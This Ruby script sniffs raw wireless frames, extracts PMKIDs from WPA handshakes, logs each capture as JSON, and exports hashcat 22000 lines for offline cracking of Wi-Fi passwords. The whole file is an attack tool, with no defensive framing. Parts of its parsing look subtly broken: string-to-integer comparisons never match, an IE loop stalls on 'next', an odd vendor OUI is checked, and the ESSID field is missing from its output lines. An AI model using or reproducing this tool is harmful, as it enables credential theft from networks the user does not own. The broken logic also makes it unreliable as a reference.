#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'socket'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def parse_radiotap(data)
  return [0, 0] if data.size < 4
  len = data[2..3].unpack1('v')
  [len, data[2..3].unpack1('v')]
end

def parse_frame(data)
  return nil if data.size < 24
  fc = data[0..1].unpack1('v')
  frame_type = (fc >> 2) & 0x3
  frame_subtype = (fc >> 4) & 0xF
  to_ds = (fc >> 8) & 0x1
  from_ds = (fc >> 9) & 0x1

  addr1 = data[4..9].unpack('H2 H2 H2 H2 H2 H2').map { |b| b.upcase }.join(':')
  addr2 = data[10..15].unpack('H2 H2 H2 H2 H2 H2').map { |b| b.upcase }.join(':')
  addr3 = data[16..21].unpack('H2 H2 H2 H2 H2 H2').map { |b| b.upcase }.join(':')

  { fc: fc, type: frame_type, subtype: frame_subtype, to_ds: to_ds, from_ds: from_ds,
    addr1: addr1, addr2: addr2, addr3: addr3 }
end

def extract_pmkid_from_eapol(data)
  return nil if data.size < 99
  eapol_len = data.size
  ie_offset = 0

  while ie_offset < eapol_len - 4
    tag = data[ie_offset]
    if tag == 0xDD && ie_offset + 1 < eapol_len
      ie_len = data[ie_offset + 1]
              next if ie_len.nil? || ie_len < 18
      if ie_offset + 2 + ie_len <= eapol_len
        oui = data[ie_offset + 2..ie_offset + 4]
        if oui == "\x00\x50\xF2" && data[ie_offset + 5] == 0x04
          pmkid = data[ie_offset + 8..ie_offset + 23]
          return pmkid.unpack('H*').first if pmkid && pmkid.size == 16
        end
      end
    end
    ie_offset += data[ie_offset + 1] + 2 rescue break
  end
  nil
end

def build_hccapx(ap_mac, client_mac, pmkid)
  pmkid_hex = pmkid
  ap_mac_hex = ap_mac.gsub(':', '').downcase
  client_mac_hex = client_mac.gsub(':', '').downcase
  "WPA*01*#{pmkid_hex}*#{ap_mac_hex}*#{client_mac_hex}***"
end

begin
  iface = ARGV[0]
  output_prefix = ARGV[1] || 'pmkid_dump'
  timeout = (ARGV[2] || '60').to_i

  raise 'interface required' unless iface
  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx

  emit('pmkid_harvest_start', iface, '', '', 0, { timeout: timeout, output_prefix: output_prefix })

  sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
  sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVBUF, 2_097_152)

  pmkids = {}
  start_time = Time.now
  hccapx_lines = []

  while Time.now - start_time < timeout
    raw = sock.recvfrom(4096)[0]
    rt_len = raw[2..3].unpack1('v') rescue 0
    next if rt_len < 4 || rt_len >= raw.size
    frame = raw[rt_len..]
    next if frame.nil? || frame.size < 24

    fc = frame[0..1].unpack1('v')
    frame_type = (fc >> 2) & 0x3
    frame_subtype = (fc >> 4) & 0xF

    next unless frame_type == 2 && frame_subtype == 0xB

    addr1 = frame[4..9].unpack('H2H2H2H2H2H2').map { |b| b.upcase }.join(':')
    addr2 = frame[10..15].unpack('H2H2H2H2H2H2').map { |b| b.upcase }.join(':')

    llc_offset = 24
    eapol_data = frame[llc_offset + 8..] if frame.size > llc_offset + 8
    next unless eapol_data && eapol_data.size >= 99

    pmkid_hex = extract_pmkid_from_eapol(eapol_data)
    next unless pmkid_hex

    ap_mac = addr2
    client_mac = addr1

    unless pmkids[ap_mac]
      pmkids[ap_mac] = { client: client_mac, pmkid: pmkid_hex, count: 0 }
    end
    pmkids[ap_mac][:count] += 1

    hccapx_line = build_hccapx(ap_mac, client_mac, pmkid_hex)
    hccapx_lines << hccapx_line

    emit('pmkid_found', iface, ap_mac, '', 0, {
      client: client_mac, pmkid: pmkid_hex, hccapx: hccapx_line, count: pmkids[ap_mac][:count]
    })
  end

  sock.close

  unless hccapx_lines.empty?
    File.write("#{output_prefix}.hc22000", hccapx_lines.uniq.join("\n") + "\n")
    emit('pmkid_export', iface, '', '', 0, { file: "#{output_prefix}.hc22000", count: hccapx_lines.uniq.size })
  end

  emit('pmkid_harvest_complete', iface, '', '', 0, { aps_found: pmkids.size, output_prefix: output_prefix })

rescue Interrupt
  emit('pmkid_interrupted', iface || '', '', '', 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
